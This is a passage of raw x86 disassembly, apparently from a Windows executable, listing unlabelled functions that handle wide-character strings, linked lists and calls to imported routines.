  408322:	jne    0x408366
  408324:	push   0x28
  408326:	pop    edi
  408327:	lea    edx,[eax+0x2]
  40832a:	push   0x24
  40832c:	cmp    WORD PTR [edx],di
  40832f:	pop    edi
  408330:	jne    0x408366
  408332:	mov    WORD PTR [esi],di
  408335:	push   0x28
  408337:	pop    eax
  408338:	add    esi,ebx
  40833a:	push   0xa
  40833c:	mov    WORD PTR [esi],ax
  40833f:	mov    eax,edx
  408341:	pop    edx
  408342:	movzx  ecx,WORD PTR [eax]
  408345:	cmp    cx,dx
  408348:	je     0x40837c
  40834a:	cmp    cx,0x29
  40834e:	je     0x40835f
  408350:	add    eax,ebx
  408352:	mov    WORD PTR [esi],cx
  408355:	movzx  ecx,WORD PTR [eax]
  408358:	add    esi,ebx
  40835a:	cmp    cx,dx
  40835d:	jne    0x40834a
  40835f:	cmp    WORD PTR [eax],dx
  408362:	je     0x40837c
  408364:	jmp    0x408370
  408366:	mov    WORD PTR [esi],cx
  408369:	push   0xa
  40836b:	add    esi,ebx
  40836d:	add    eax,ebx
  40836f:	pop    edx
  408370:	movzx  ecx,WORD PTR [eax]
  408373:	test   cx,cx
  408376:	jne    0x4082c9
  40837c:	mov    edi,DWORD PTR [ebp-0xc]
  40837f:	xor    ecx,ecx
  408381:	mov    WORD PTR [esi],cx
  408384:	mov    DWORD PTR [edi],eax
  408386:	mov    eax,0x432430
  40838b:	jmp    0x40838f
  40838d:	xor    eax,eax
  40838f:	pop    edi
  408390:	pop    esi
  408391:	pop    ebx
  408392:	leave  
  408393:	ret    
  408394:	push   ebp
  408395:	mov    ebp,esp
  408397:	sub    esp,0x81c
  40839d:	mov    eax,ds:0x411018
  4083a2:	xor    eax,ebp
  4083a4:	mov    DWORD PTR [ebp-0x4],eax
  4083a7:	mov    eax,DWORD PTR [ebp+0x8]
  4083aa:	push   ebx
  4083ab:	push   esi
  4083ac:	push   edi
  4083ad:	mov    DWORD PTR [ebp-0x814],eax
  4083b3:	xor    eax,eax
  4083b5:	push   0x401880
  4083ba:	mov    BYTE PTR [ebp-0x805],al
  4083c0:	mov    DWORD PTR [ebp-0x810],eax
  4083c6:	lea    eax,[ebp-0x804]
  4083cc:	push   0x400
  4083d1:	push   eax
  4083d2:	mov    DWORD PTR [ebp-0x818],edx
  4083d8:	mov    edi,ecx
  4083da:	call   DWORD PTR ds:0x4373d0
  4083e0:	add    esp,0xc
  4083e3:	mov    edx,0x3fe
  4083e8:	lea    ecx,[ebp-0x800]
  4083ee:	call   0x40816f
  4083f3:	test   eax,eax
  4083f5:	jne    0x408432
  4083f7:	push   DWORD PTR ds:0x421f0c
  4083fd:	call   DWORD PTR ds:0x437468
  408403:	pop    ecx
  408404:	test   eax,eax
  408406:	je     0x408420
  408408:	push   0x401878
  40840d:	push   0x409
  408412:	push   DWORD PTR ds:0x4216d4
  408418:	call   0x405021
  40841d:	add    esp,0xc
  408420:	push   0x41d
  408425:	push   DWORD PTR ds:0x4216d4
  40842b:	call   0x405021
  408430:	pop    ecx
  408431:	pop    ecx
  408432:	lea    eax,[ebp-0x804]
  408438:	mov    ecx,eax
  40843a:	mov    DWORD PTR [ebp-0x80c],eax
  408440:	call   0x4081dd
  408445:	jmp    0x408471
  408447:	push   0xc
  408449:	pop    ecx
  40844a:	call   0x40a320
  40844f:	mov    ecx,esi
  408451:	mov    ebx,eax
  408453:	call   0x40dd18
  408458:	mov    DWORD PTR [ebx+0x4],eax
  40845b:	mov    eax,ds:0x432350
  408460:	mov    ecx,0x432350
  408465:	jmp    0x40846b
  408467:	mov    ecx,eax
  408469:	mov    eax,DWORD PTR [ecx]
  40846b:	test   eax,eax
  40846d:	jne    0x408467
  40846f:	mov    DWORD PTR [ecx],ebx
  408471:	lea    ecx,[ebp-0x80c]
  408477:	call   0x40826f
  40847c:	mov    esi,eax
  40847e:	test   esi,esi
  408480:	jne    0x408447
  408482:	cmp    DWORD PTR ds:0x432350,eax
  408488:	je     0x408612
  40848e:	push   0x2
  408490:	pop    edx
  408491:	lea    ebx,[ebp-0x804]
  408497:	mov    ax,WORD PTR [ebx]
  40849a:	mov    WORD PTR [edi],ax
  40849d:	mov    eax,DWORD PTR [ebp-0x814]
  4084a3:	add    edi,edx
  4084a5:	add    ebx,edx
  4084a7:	cmp    edi,DWORD PTR [eax]
  4084a9:	jne    0x408573
  4084af:	mov    eax,DWORD PTR [ebp-0x810]
  4084b5:	test   eax,eax
  4084b7:	jne    0x408508
  4084b9:	xor    ecx,ecx
  4084bb:	mov    edi,0x800
  4084c0:	mov    eax,edi
  4084c2:	mul    edx
  4084c4:	seto   cl
  4084c7:	neg    ecx
  4084c9:	or     ecx,eax
  4084cb:	call   0x40a2fb
  4084d0:	mov    esi,eax
  4084d2:	mov    eax,DWORD PTR [ebp-0x818]
  4084d8:	push   0x400
  4084dd:	push   DWORD PTR [eax]
  4084df:	mov    DWORD PTR [ebp-0x810],esi
  4084e5:	push   edi
  4084e6:	push   esi
  4084e7:	call   DWORD PTR ds:0x43746c
  4084ed:	add    esp,0x10
  4084f0:	lea    edi,[esi+0x800]
  4084f6:	mov    DWORD PTR [ebp-0x80c],0x800
  408500:	lea    eax,[esi+0x1000]
  408506:	jmp    0x40855e
  408508:	mov    edi,DWORD PTR [ebp-0x80c]
  40850e:	lea    esi,[edi+0x400]
  408514:	cmp    esi,edi
  408516:	jb     0x40852c
  408518:	lea    edx,[esi+esi*1]
  40851b:	mov    ecx,eax
  40851d:	call   0x40a33e
  408522:	mov    DWORD PTR [ebp-0x81c],eax
  408528:	test   eax,eax
  40852a:	jne    0x408544
  40852c:	push   0x419
  408531:	push   DWORD PTR ds:0x4216d4
  408537:	call   0x405021
  40853c:	mov    eax,DWORD PTR [ebp-0x81c]
  408542:	pop    ecx
  408543:	pop    ecx
  408544:	mov    ecx,esi
  408546:	mov    DWORD PTR [ebp-0x810],eax
  40854c:	mov    esi,DWORD PTR [ebp-0x810]
  408552:	lea    edi,[eax+edi*2]
  408555:	mov    DWORD PTR [ebp-0x80c],ecx
  40855b:	lea    eax,[eax+ecx*2]
  40855e:	mov    ecx,DWORD PTR [ebp-0x814]
  408564:	push   0x2
  408566:	mov    DWORD PTR [ecx],eax
  408568:	mov    eax,DWORD PTR [ebp-0x818]
  40856e:	pop    edx
  40856f:	mov    DWORD PTR [eax],esi
  408571:	xor    esi,esi
  408573:	cmp    WORD PTR [ebx],si
  408576:	jne    0x408497
  40857c:	cmp    BYTE PTR [ebp-0x805],0x0
  408583:	je     0x40862a
  408589:	push   0x3c
  40858b:	pop    ecx
  40858c:	cmp    WORD PTR [ebp-0x804],cx
  408593:	jne    0x40862a
  408599:	cmp    WORD PTR [ebp-0x802],cx
  4085a0:	jne    0x40862a
  4085a6:	mov    eax,ds:0x432350
  4085ab:	cmp    DWORD PTR [eax],esi
  4085ad:	je     0x4085fe
  4085af:	mov    edx,0x400
  4085b4:	lea    ecx,[ebp-0x804]
  4085ba:	call   0x40816f
  4085bf:	test   eax,eax
  4085c1:	jne    0x4085fe
  4085c3:	push   DWORD PTR ds:0x421f0c
  4085c9:	call   DWORD PTR ds:0x437468
  4085cf:	pop    ecx
  4085d0:	test   eax,eax
  4085d2:	je     0x4085ec
  4085d4:	push   0x401878
  4085d9:	push   0x409
  4085de:	push   DWORD PTR ds:0x4216d4
  4085e4:	call   0x405021
  4085e9:	add    esp,0xc
  4085ec:	push   0x41d
  4085f1:	push   DWORD PTR ds:0x4216d4
  4085f7:	call   0x405021
  4085fc:	pop    ecx
  4085fd:	pop    ecx
  4085fe:	mov    eax,ds:0x432350
  408603:	mov    eax,DWORD PTR [eax]
  408605:	mov    ds:0x432350,eax
  40860a:	test   eax,eax
  40860c:	jne    0x40848e
  408612:	mov    ecx,DWORD PTR [ebp-0x4]
  408615:	xor    eax,eax
  408617:	mov    WORD PTR [edi],ax
  40861a:	mov    eax,edi
  40861c:	pop    edi
  40861d:	pop    esi
  40861e:	xor    ecx,ebp
  408620:	pop    ebx
  408621:	call   0x40fd0b
  408626:	leave  
  408627:	ret    0x4
  40862a:	mov    edx,0x400
  40862f:	lea    ecx,[ebp-0x804]
  408635:	mov    BYTE PTR [ebp-0x805],0x1
  40863c:	call   0x40816f
  408641:	push   0x2
  408643:	pop    edx
  408644:	test   eax,eax
  408646:	jne    0x408491
  40864c:	push   DWORD PTR ds:0x421f0c
  408652:	call   DWORD PTR ds:0x437468
  408658:	pop    ecx
  408659:	test   eax,eax
  40865b:	je     0x408675
  40865d:	push   0x401878
  408662:	push   0x409
  408667:	push   DWORD PTR ds:0x4216d4
  40866d:	call   0x405021
  408672:	add    esp,0xc
  408675:	push   0x41d
  40867a:	push   DWORD PTR ds:0x4216d4
  408680:	call   0x405021
  408685:	pop    ecx
  408686:	pop    ecx
  408687:	jmp    0x40848e
  40868c:	push   ebp
  40868d:	mov    ebp,esp
  40868f:	sub    esp,0x14
  408692:	mov    eax,ds:0x411018
  408697:	xor    eax,ebp
  408699:	mov    DWORD PTR [ebp-0x4],eax
  40869c:	push   ebx
  40869d:	mov    eax,ecx
  40869f:	push   esi
  4086a0:	push   edi
  4086a1:	mov    edi,DWORD PTR [eax]
  4086a3:	mov    esi,edi
  4086a5:	mov    DWORD PTR [ebp-0xc],edx
  4086a8:	mov    DWORD PTR [ebp-0x10],eax
  4086ab:	lea    ecx,[esi+0x2]
  4086ae:	xor    ebx,ebx
  4086b0:	mov    ax,WORD PTR [esi]
  4086b3:	add    esi,0x2
  4086b6:	cmp    ax,bx
  4086b9:	jne    0x4086b0
  4086bb:	sub    esi,ecx
  4086bd:	mov    ecx,edx
  4086bf:	sar    esi,1
  4086c1:	lea    edx,[ecx+0x2]
  4086c4:	mov    ax,WORD PTR [ecx]
  4086c7:	add    ecx,0x2
  4086ca:	cmp    ax,bx
  4086cd:	jne    0x4086c4
  4086cf:	sub    ecx,edx
  4086d1:	sar    ecx,1
  4086d3:	dec    esi
  4086d4:	add    esi,ecx
  4086d6:	mov    DWORD PTR [ebp-0x8],esi
  4086d9:	lea    eax,[esi+esi*1]
  4086dc:	call   0x410420
  4086e1:	mov    ebx,esp
  4086e3:	push   0x3c
  4086e5:	mov    eax,ebx
  4086e7:	pop    edx
  4086e8:	movzx  ecx,WORD PTR [edi]
  4086eb:	cmp    cx,dx
  4086ee:	je     0x4086f5
  4086f0:	mov    WORD PTR [eax],cx
  4086f3:	jmp    0x4086fe
  4086f5:	cmp    WORD PTR [edi+0x2],dx
  4086f9:	je     0x408706
  4086fb:	mov    WORD PTR [eax],dx
  4086fe:	add    edi,0x2
  408701:	add    eax,0x2
  408704:	jmp    0x4086e8
  408706:	push   DWORD PTR [ebp-0xc]
  408709:	xor    ecx,ecx
  40870b:	push   esi
  40870c:	mov    esi,DWORD PTR ds:0x4373d4
  408712:	push   ebx
  408713:	mov    WORD PTR [eax],cx
  408716:	call   esi
  408718:	add    esp,0xc
  40871b:	lea    eax,[edi+0x4]
  40871e:	push   eax
  40871f:	push   DWORD PTR [ebp-0x8]
  408722:	push   ebx
  408723:	call   esi
  408725:	mov    esi,ebx
  408727:	add    esp,0xc
  40872a:	lea    ecx,[esi+0x2]
  40872d:	xor    edx,edx
  40872f:	mov    ax,WORD PTR [esi]
  408732:	add    esi,0x2
  408735:	cmp    ax,dx
  408738:	jne    0x40872f
  40873a:	mov    edi,DWORD PTR [ebp-0x10]
  40873d:	sub    esi,ecx
  40873f:	mov    ecx,DWORD PTR [edi]
  408741:	sar    esi,1
  408743:	inc    esi
  408744:	lea    edx,[esi+esi*1]
  408747:	call   0x40a33e
  40874c:	push   ebx
  40874d:	push   esi
  40874e:	push   eax
  40874f:	mov    DWORD PTR [edi],eax
  408751:	call   DWORD PTR ds:0x4373d0
  408757:	add    esp,0xc
  40875a:	lea    esp,[ebp-0x20]
  40875d:	pop    edi
  40875e:	pop    esi
  40875f:	pop    ebx
  408760:	mov    ecx,DWORD PTR [ebp-0x4]
  408763:	xor    ecx,ebp
  408765:	call   0x40fd0b
  40876a:	leave  
  40876b:	ret    
  40876c:	push   ebp
  40876d:	mov    ebp,esp
  40876f:	sub    esp,0x10
  408772:	push   ebx
  408773:	push   esi
  408774:	push   edi
  408775:	mov    edi,ecx
  408777:	xor    eax,eax
  408779:	mov    ebx,edx
  40877b:	mov    DWORD PTR [ebp-0x4],ebx
  40877e:	mov    DWORD PTR [ebp-0x8],ecx
  408781:	mov    esi,edi
  408783:	mov    DWORD PTR [ebp-0x10],eax
  408786:	cmp    WORD PTR [edi],ax
  408789:	je     0x4087a4
  40878b:	movzx  eax,WORD PTR [esi]
  40878e:	push   eax
  40878f:	call   DWORD PTR ds:0x43753c
  408795:	pop    ecx
  408796:	test   eax,eax
  408798:	je     0x4087ca
  40879a:	add    esi,0x2
  40879d:	xor    eax,eax
  40879f:	cmp    WORD PTR [esi],ax
  4087a2:	jne    0x40878b
  4087a4:	cmp    BYTE PTR [ebp+0x8],0x0
  4087a8:	mov    eax,0x401898
  4087ad:	jne    0x4087b4
  4087af:	mov    eax,0x4018a0
  4087b4:	push   ebx
  4087b5:	push   eax
  4087b6:	push   0x4018a4
  4087bb:	call   0x40c2d0
  4087c0:	add    esp,0xc
  4087c3:	pop    edi
  4087c4:	pop    esi
  4087c5:	pop    ebx
  4087c6:	leave  
  4087c7:	ret    0x4
  4087ca:	mov    ecx,ebx
  4087cc:	xor    esi,esi
  4087ce:	lea    edx,[ecx+0x2]
  4087d1:	mov    ax,WORD PTR [ecx]
  4087d4:	add    ecx,0x2
  4087d7:	cmp    ax,si
  4087da:	jne    0x4087d1
  4087dc:	sub    ecx,edx
  4087de:	sar    ecx,1
  4087e0:	lea    eax,[ecx+0xc]
  4087e3:	mov    ecx,0x400
  4087e8:	sub    ecx,eax
  4087ea:	mov    DWORD PTR [ebp-0xc],ecx
  4087ed:	cmp    WORD PTR [edi],si
  4087f0:	je     0x4087c3
  4087f2:	mov    al,BYTE PTR [ebp+0x8]
  4087f5:	mov    BYTE PTR [ebp+0xb],al
  4087f8:	push   ecx
  4087f9:	push   edi
  4087fa:	push   0x400
  4087ff:	push   0x435688
  408804:	call   DWORD PTR ds:0x43746c
  40880a:	mov    esi,0x435688
  40880f:	add    esp,0x10
  408812:	lea    ecx,[esi+0x2]
  408815:	xor    edx,edx
  408817:	mov    ax,WORD PTR [esi]
  40881a:	add    esi,0x2
  40881d:	cmp    ax,dx
  408820:	jne    0x408817
  408822:	sub    esi,ecx
  408824:	mov    ecx,edi
  408826:	sar    esi,1
  408828:	lea    edx,[ecx+0x2]
  40882b:	mov    ax,WORD PTR [ecx]
  40882e:	add    ecx,0x2
  408831:	cmp    ax,WORD PTR [ebp-0x10]
  408835:	jne    0x40882b
  408837:	sub    ecx,edx
  408839:	sar    ecx,1
  40883b:	cmp    DWORD PTR [ebp-0xc],ecx
  40883e:	jae    0x40887a
  408840:	cmp    WORD PTR ds:0x435688,0x0
  408848:	mov    ebx,0x435688
  40884d:	je     0x408877
  40884f:	xor    eax,eax
  408851:	mov    edi,eax
  408853:	movzx  eax,WORD PTR [ebx]
  408856:	push   eax
  408857:	call   DWORD PTR ds:0x43753c
  40885d:	pop    ecx
  40885e:	test   eax,eax
  408860:	je     0x408867
  408862:	mov    esi,edi
  408864:	sar    esi,1
  408866:	inc    esi
  408867:	add    ebx,0x2
  40886a:	xor    eax,eax
  40886c:	add    edi,0x2
  40886f:	cmp    WORD PTR [ebx],ax
  408872:	jne    0x408853
  408874:	mov    edi,DWORD PTR [ebp-0x8]
  408877:	mov    ebx,DWORD PTR [ebp-0x4]
  40887a:	add    esi,esi
  40887c:	cmp    esi,0x800
  408882:	jae    0x4088cc
  408884:	xor    eax,eax
  408886:	cmp    BYTE PTR [ebp+0xb],al
  408889:	mov    WORD PTR [esi+0x435688],ax
  408890:	mov    eax,0x401898
  408895:	jne    0x40889c
  408897:	mov    eax,0x4018a0
  40889c:	push   ebx
  40889d:	push   eax
  40889e:	push   0x435688
  4088a3:	push   0x4018c0
  4088a8:	call   0x40c2d0
  4088ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4088b0:	add    edi,esi
  4088b2:	xor    eax,eax
  4088b4:	add    esp,0x10
  4088b7:	mov    DWORD PTR [ebp-0x8],edi
  4088ba:	mov    BYTE PTR [ebp+0xb],0x1
  4088be:	cmp    WORD PTR [edi],ax
  4088c1:	jne    0x4087f8
  4088c7:	jmp    0x4087c3
  4088cc:	call   0x40fe50
  4088d1:	int3   
  4088d2:	push   ebp
  4088d3:	mov    ebp,esp
  4088d5:	sub    esp,0x18
  4088d8:	push   ebx
  4088d9:	push   esi
  4088da:	mov    esi,DWORD PTR [ebp+0x8]
  4088dd:	push   edi
  4088de:	push   0x401880
  4088e3:	push   DWORD PTR [esi]
  4088e5:	mov    edi,ecx
  4088e7:	mov    DWORD PTR [ebp-0x14],edx
  4088ea:	mov    DWORD PTR [ebp-0x8],edi
  4088ed:	mov    BYTE PTR [ebp-0x2],0x1
  4088f1:	call   DWORD PTR ds:0x437470
  4088f7:	pop    ecx
  4088f8:	pop    ecx
  4088f9:	push   0xa
  4088fb:	mov    BYTE PTR [ebp-0x1],0x0
  4088ff:	pop    ecx
  408900:	test   eax,eax
  408902:	je     0x4089f6
  408908:	cmp    eax,DWORD PTR [esi]
  40890a:	je     0x408916
  40890c:	cmp    WORD PTR [eax-0x2],cx
  408910:	jne    0x4089f6
  408916:	lea    ebx,[eax+0x4]
  408919:	push   ecx
  40891a:	push   ebx
  40891b:	call   DWORD PTR ds:0x437540
  408921:	mov    edi,eax
  408923:	pop    ecx
  408924:	pop    ecx
  408925:	test   edi,edi
  408927:	je     0x40892e
  408929:	xor    eax,eax
  40892b:	mov    WORD PTR [edi],ax
  40892e:	mov    ecx,ebx
  408930:	call   0x40dd18
  408935:	mov    DWORD PTR [ebp-0x10],eax
  408938:	test   edi,edi
  40893a:	je     0x408942
  40893c:	push   0xa
  40893e:	pop    ecx
  40893f:	mov    WORD PTR [edi],cx
  408942:	and    DWORD PTR [ebp-0xc],0x0
  408946:	lea    ecx,[ebp-0xc]
  408949:	push   ecx
  40894a:	push   0x401924
  40894f:	push   eax
  408950:	call   DWORD PTR ds:0x4373c8
  408956:	mov    edi,eax
  408958:	add    esp,0xc
  40895b:	test   edi,edi
  40895d:	je     0x4089d0
  40895f:	mov    ebx,DWORD PTR ds:0x437548
  408965:	mov    esi,DWORD PTR [ebp+0x10]
  408968:	push   0x4018e0
  40896d:	push   edi
  40896e:	call   ebx
  408970:	pop    ecx
  408971:	pop    ecx
  408972:	test   eax,eax
  408974:	jne    0x40897b
  408976:	mov    BYTE PTR [esi],0x1
  408979:	jmp    0x4089b3
  40897b:	push   0x4018ec
  408980:	push   edi
  408981:	call   ebx
  408983:	pop    ecx
  408984:	pop    ecx
  408985:	test   eax,eax
  408987:	jne    0x40898d
  408989:	mov    BYTE PTR [esi],al
  40898b:	jmp    0x4089b3
  40898d:	push   0x4018fc
  408992:	push   edi
  408993:	call   ebx
  408995:	pop    ecx
  408996:	pop    ecx
  408997:	test   eax,eax
  408999:	jne    0x4089a1
  40899b:	mov    BYTE PTR [ebp-0x1],0x1
  40899f:	jmp    0x4089b3
  4089a1:	push   0x446
  4089a6:	push   DWORD PTR ds:0x4216d4
  4089ac:	call   0x405021
  4089b1:	pop    ecx
  4089b2:	pop    ecx
  4089b3:	lea    eax,[ebp-0xc]
  4089b6:	push   eax
  4089b7:	push   0x401924
  4089bc:	push   0x0
  4089be:	call   DWORD PTR ds:0x4373c8
  4089c4:	mov    edi,eax
  4089c6:	add    esp,0xc
  4089c9:	test   edi,edi
  4089cb:	jne    0x408968
  4089cd:	mov    esi,DWORD PTR [ebp+0x8]
  4089d0:	push   DWORD PTR [ebp-0x10]
  4089d3:	call   DWORD PTR ds:0x43754c
  4089d9:	cmp    BYTE PTR [ebp-0x1],0x0
  4089dd:	mov    edi,DWORD PTR [ebp-0x8]
  4089e0:	pop    ecx
  4089e1:	je     0x4089f6
  4089e3:	push   edi
  4089e4:	push   0x1
  4089e6:	push   0x2
  4089e8:	push   0x401920
  4089ed:	call   DWORD PTR ds:0x437474
  4089f3:	add    esp,0x10
  4089f6:	push   0x2
  4089f8:	push   0x401880
  4089fd:	push   DWORD PTR [esi]
  4089ff:	jmp    0x408ad2
  408a04:	push   0xa
  408a06:	pop    eax
  408a07:	push   eax
  408a08:	push   DWORD PTR [esi]
  408a0a:	call   DWORD PTR ds:0x437540
  408a10:	mov    ebx,eax
  408a12:	pop    ecx
  408a13:	pop    ecx
  408a14:	test   ebx,ebx
  408a16:	je     0x408ae6
  408a1c:	cmp    BYTE PTR [ebp+0xc],0x0
  408a20:	je     0x408a41
  408a22:	mov    edx,DWORD PTR [ebp-0x14]
  408a25:	mov    ecx,DWORD PTR [esi]
  408a27:	xor    eax,eax
  408a29:	cmp    BYTE PTR [ebp-0x2],al
  408a2c:	mov    WORD PTR [ebx],ax
  408a2f:	sete   al
  408a32:	movzx  eax,al
  408a35:	push   eax
  408a36:	call   0x40876c
  408a3b:	push   0xa
  408a3d:	pop    eax
  408a3e:	mov    WORD PTR [ebx],ax
  408a41:	cmp    BYTE PTR [ebp-0x1],0x0
  408a45:	je     0x408a6e
  408a47:	mov    eax,ebx
  408a49:	sub    eax,DWORD PTR [esi]
  408a4b:	push   edi
  408a4c:	push   0x2
  408a4e:	sar    eax,1
  408a50:	push   eax
  408a51:	push   DWORD PTR [esi]
  408a53:	call   DWORD PTR ds:0x437474
  408a59:	push   edi
  408a5a:	push   0x1
  408a5c:	push   0x4
  408a5e:	push   0x40191c
  408a63:	call   DWORD PTR ds:0x437474
  408a69:	add    esp,0x20
  408a6c:	jmp    0x408ac1
  408a6e:	mov    edi,DWORD PTR [esi]
  408a70:	cmp    edi,ebx
  408a72:	jae    0x408aab
  408a74:	mov    esi,DWORD PTR [ebp-0x8]
  408a77:	xor    ecx,ecx
  408a79:	push   ecx
  408a7a:	push   ecx
  408a7b:	push   0x4
  408a7d:	lea    eax,[ebp+0x10]
  408a80:	push   eax
  408a81:	push   0x1
  408a83:	push   edi
  408a84:	push   ecx
  408a85:	push   ecx
  408a86:	call   DWORD PTR ds:0x437328
  408a8c:	test   eax,eax
  408a8e:	je     0x408aa1
  408a90:	push   esi
  408a91:	push   0x1
  408a93:	push   eax
  408a94:	lea    eax,[ebp+0x10]
  408a97:	push   eax
  408a98:	call   DWORD PTR ds:0x437474
  408a9e:	add    esp,0x10
  408aa1:	add    edi,0x2
  408aa4:	cmp    edi,ebx
  408aa6:	jb     0x408a77
  408aa8:	mov    esi,DWORD PTR [ebp+0x8]
  408aab:	mov    edi,DWORD PTR [ebp-0x8]
  408aae:	push   edi
  408aaf:	push   0x1
  408ab1:	push   0x2
  408ab3:	push   0x401918
  408ab8:	call   DWORD PTR ds:0x437474
  408abe:	add    esp,0x10
  408ac1:	push   0x2
  408ac3:	lea    eax,[ebx+0x2]
  408ac6:	push   0x401880
  408acb:	mov    DWORD PTR [esi],eax
  408acd:	mov    BYTE PTR [ebp-0x2],0x0
  408ad1:	push   eax
  408ad2:	call   DWORD PTR ds:0x437478
  408ad8:	add    esp,0xc
  408adb:	test   eax,eax
  408add:	jne    0x408a04
  408ae3:	add    DWORD PTR [esi],0x4
  408ae6:	pop    edi
  408ae7:	pop    esi
  408ae8:	pop    ebx
  408ae9:	leave  
  408aea:	ret    0xc
  408aed:	push   ebp
  408aee:	mov    ebp,esp
  408af0:	sub    esp,0x43c
  408af6:	mov    eax,ds:0x411018
  408afb:	xor    eax,ebp
  408afd:	mov    DWORD PTR [ebp-0x4],eax
  408b00:	push   ebx
  408b01:	push   esi
  408b02:	push   edi
  408b03:	mov    edi,DWORD PTR [ebp+0x8]
  408b06:	push   0xa
  408b08:	pop    eax
  408b09:	mov    esi,ecx
  408b0b:	push   eax
  408b0c:	push   esi
  408b0d:	mov    DWORD PTR [ebp-0x420],edx
  408b13:	call   DWORD PTR ds:0x437540
  408b19:	pop    ecx
  408b1a:	mov    ebx,eax
  408b1c:	pop    ecx
  408b1d:	mov    ecx,esi
  408b1f:	test   ebx,ebx
  408b21:	jne    0x408b37
  408b23:	call   0x40dd18
  408b28:	mov    ecx,DWORD PTR [ebp-0x420]
  408b2e:	mov    DWORD PTR [ecx],eax
  408b30:	xor    al,al
  408b32:	jmp    0x408ed2
  408b37:	xor    eax,eax
  408b39:	push   edi
  408b3a:	or     dl,0xff
  408b3d:	mov    WORD PTR [ebx],ax
  408b40:	call   0x40e68f
  408b45:	mov    ecx,DWORD PTR [ebp-0x420]
  408b4b:	push   0xa
  408b4d:	mov    DWORD PTR [ecx],eax
  408b4f:	pop    eax
  408b50:	mov    WORD PTR [ebx],ax
  408b53:	add    ebx,0x2
  408b56:	cmp    DWORD PTR [ecx],esi
  408b58:	jne    0x408b6b
  408b5a:	mov    ecx,esi
  408b5c:	call   0x40dd18
  408b61:	mov    esi,DWORD PTR [ebp-0x420]
  408b67:	mov    DWORD PTR [esi],eax
  408b69:	jmp    0x408b6d
  408b6b:	mov    esi,ecx
  408b6d:	mov    eax,DWORD PTR [esi]
  408b6f:	push   edi
  408b70:	or     dl,0xff
  408b73:	mov    ecx,ebx
  408b75:	mov    DWORD PTR [ebp-0x424],eax
  408b7b:	call   0x40e68f
  408b80:	mov    edi,eax
  408b82:	lea    ecx,[ebp-0x424]
  408b88:	mov    DWORD PTR [ebp-0x43c],edi
  408b8e:	mov    DWORD PTR [ebp-0x430],edi
  408b94:	call   0x40826f
  408b99:	test   eax,eax
  408b9b:	je     0x408ec4
  408ba1:	xor    ecx,ecx
  408ba3:	mov    DWORD PTR [ebp-0x434],ecx
  408ba9:	mov    BYTE PTR [ebp-0x419],cl
  408baf:	mov    ecx,eax
  408bb1:	call   0x40dd18
  408bb6:	mov    edi,eax
  408bb8:	xor    eax,eax
  408bba:	mov    DWORD PTR [ebp-0x428],edi
  408bc0:	cmp    WORD PTR [edi],ax
  408bc3:	jne    0x408d5a
  408bc9:	push   0x40190c
  408bce:	mov    DWORD PTR [ebp-0x438],eax
  408bd4:	mov    edi,0x103
  408bd9:	push   edi
  408bda:	lea    eax,[ebp-0x210]
  408be0:	push   eax
  408be1:	lea    eax,[ebp-0x438]
  408be7:	push   eax
  408be8:	call   DWORD PTR ds:0x437418
  408bee:	add    esp,0x10
  408bf1:	test   eax,eax
  408bf3:	jne    0x408bfd
  408bf5:	cmp    DWORD PTR [ebp-0x438],eax
  408bfb:	jne    0x408c13
  408bfd:	push   0x401914
  408c02:	lea    eax,[ebp-0x210]
  408c08:	push   edi
  408c09:	push   eax
  408c0a:	call   DWORD PTR ds:0x4373d0
  408c10:	add    esp,0xc
  408c13:	lea    eax,[ebp-0x418]
  408c19:	push   eax
  408c1a:	xor    ecx,ecx
  408c1c:	push   ecx
  408c1d:	push   0x401888
  408c22:	lea    eax,[ebp-0x210]
  408c28:	mov    edi,ecx
  408c2a:	push   eax
  408c2b:	mov    DWORD PTR [ebp-0x42c],edi
  408c31:	call   DWORD PTR ds:0x437324
  408c37:	test   eax,eax
  408c39:	je     0x408c76
  408c3b:	lea    eax,[ebp-0x418]
  408c41:	push   eax
  408c42:	lea    eax,[ebp-0x210]
  408c48:	push   0x103
  408c4d:	push   eax
  408c4e:	call   DWORD PTR ds:0x4373d0
  408c54:	add    esp,0xc
  408c57:	lea    eax,[ebp-0x210]
  408c5d:	push   0x20
  408c5f:	push   0x401890
  408c64:	push   eax
  408c65:	call   DWORD PTR ds:0x4373dc
  408c6b:	add    esp,0xc
  408c6e:	mov    edi,eax
  408c70:	mov    DWORD PTR [ebp-0x42c],eax
  408c76:	test   edi,edi
  408c78:	jne    0x408c94
  408c7a:	lea    eax,[ebp-0x210]
  408c80:	push   eax
  408c81:	push   0x41e
  408c86:	push   DWORD PTR ds:0x4216d4
  408c8c:	call   0x405021
  408c91:	add    esp,0xc
  408c94:	mov    edi,DWORD PTR ds:0x437540
  408c9a:	lea    eax,[ebp-0x210]
  408ca0:	push   0x20
  408ca2:	push   eax
  408ca3:	call   edi
  408ca5:	pop    ecx
  408ca6:	pop    ecx
  408ca7:	test   eax,eax
  408ca9:	je     0x408d28
  408cab:	push   0x22
  408cad:	pop    eax
  408cae:	push   eax
  408caf:	lea    eax,[ebp-0x210]
  408cb5:	push   eax
  408cb6:	call   edi
  408cb8:	pop    ecx
  408cb9:	pop    ecx
  408cba:	test   eax,eax
  408cbc:	jne    0x408d28
  408cbe:	lea    edi,[ebp-0x210]
  408cc4:	xor    edx,edx
  408cc6:	lea    ecx,[edi+0x2]
  408cc9:	mov    ax,WORD PTR [edi]
  408ccc:	add    edi,0x2
  408ccf:	cmp    ax,dx
  408cd2:	jne    0x408cc9
  408cd4:	sub    edi,ecx
  408cd6:	sar    edi,1
  408cd8:	lea    eax,[ebp-0x210]
  408cde:	lea    esi,[edi+edi*1]
  408ce1:	push   esi
  408ce2:	push   eax
  408ce3:	lea    eax,[ebp-0x20e]
  408ce9:	push   eax
  408cea:	call   DWORD PTR ds:0x437444
  408cf0:	add    esp,0xc
  408cf3:	lea    edi,[edi*2+0x4]
  408cfa:	push   0x22
  408cfc:	pop    eax
  408cfd:	mov    WORD PTR [ebp-0x210],ax
  408d04:	mov    WORD PTR [ebp+esi*1-0x20e],ax
  408d0c:	cmp    edi,0x206
  408d12:	jae    0x408ee3
  408d18:	mov    esi,DWORD PTR [ebp-0x420]
  408d1e:	xor    eax,eax
  408d20:	mov    WORD PTR [ebp+edi*1-0x210],ax
  408d28:	lea    edx,[ebp-0x210]
  408d2e:	mov    ecx,esi
  408d30:	call   0x40868c
  408d35:	push   DWORD PTR [ebp-0x428]
  408d3b:	call   DWORD PTR ds:0x43754c
  408d41:	pop    ecx
